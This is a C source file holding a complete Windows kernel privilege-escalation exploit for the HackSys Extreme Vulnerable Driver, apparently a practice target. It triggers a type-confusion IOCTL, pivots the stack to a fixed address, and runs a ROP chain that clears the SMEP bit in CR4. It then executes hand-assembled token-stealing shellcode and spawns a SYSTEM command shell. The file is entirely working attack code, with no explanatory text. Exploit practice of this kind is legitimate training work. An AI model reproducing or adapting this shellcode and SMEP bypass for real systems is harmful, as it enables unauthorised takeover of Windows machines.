#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#define IOCTL_TYPE_CONFUSION 0x222023
#define QWORD ULONGLONG

typedef struct UserObject {
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} UserObject;

BYTE tokenStealing[120] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    0x48, 0x8b, 0x82, 0xb8, 0x00, 0x00, 0x00,             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    0x48, 0x89, 0xc3,                                     // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00,             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00,             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    0x48, 0x83, 0xbb, 0x40, 0x04, 0x00, 0x00, 0x04,       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    0x75, 0xe8,                                           //     jnz .loop                    ; if zf == 0 -> loop
    0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00,             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    0x80, 0xe1, 0xf0,                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00,             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    0x66, 0x8b, 0x8a, 0xe4, 0x01, 0x00, 0x00,             // mov cx, [rdx + 0x1e4]            ; $cx = KernelApcDisable
    0x66, 0xff, 0xc1,                                     // inc cx                           ; fix value
    0x66, 0x89, 0x8a, 0xe4, 0x01, 0x00, 0x00,             // mov [rdx + 0x1e4], cx            ; restore value
    0x48, 0x8b, 0x92, 0x90, 0x00, 0x00, 0x00,             // mov rdx, [rdx + 0x90]            ; $rdx = ETHREAD.TrapFrame
    0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00,             // mov rbp, [rdx + 0x158]           ; $rbp = ETHREAD.TrapFrame.Rbp
    0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00,             // mov rcx, [rdx + 0x168]           ; $rcx = ETHREAD.TrapFrame.Rip
    0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,             // mov r11, [rdx + 0x178]           ; $r11 = ETHREAD.TrapFrame.EFlags
    0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,             // mov rsp, [rdx + 0x180]           ; $rsp = ETHREAD.TrapFrame.Rsp
    0x31, 0xc0,                                           // xor eax, eax                     ; $eax = STATUS SUCCESS
    0x0f, 0x01, 0xf8,                                     // swapgs                           ; swap gs segment
    0x48, 0x0f, 0x07                                      // o64 sysret                       ; return to usermode
};

QWORD GetKernelBase() {
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    return (QWORD) drivers[0];
}

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle: 0x%x\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    LPVOID shellcode = VirtualAlloc(NULL, sizeof(tokenStealing), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, tokenStealing, sizeof(tokenStealing));

    LPVOID pivot = VirtualAlloc((LPVOID) (0x48000000 - 0x1000), 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(pivot, 0x10000);

    QWORD kernelBase = GetKernelBase();

    RtlFillMemory((LPVOID)0x48000000, 0x28, 'A');
    QWORD *rop = (QWORD *) ((QWORD) 0x48000000 + 0x28);

    *rop++ = (QWORD) kernelBase + 0x23a028; // pop rcx; ret;
    *rop++ = (QWORD) 0x350ef8 ^ 1UL << 20;  // cr4 value
    *rop++ = (QWORD) kernelBase + 0x39f027; // mov cr4, rcx; ret;
    *rop++ = (QWORD) shellcode;             // token stealing

    UserObject payload;
    payload.ObjectID = 0x4141414141414141;
    payload.ObjectType = (ULONG_PTR) kernelBase + 0x2c45c0; // mov esp, 0x48000000; add esp, 0x28; ret;

    DeviceIoControl(hDevice, IOCTL_TYPE_CONFUSION, &payload, sizeof(struct UserObject), NULL, 0, NULL, NULL);
    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}
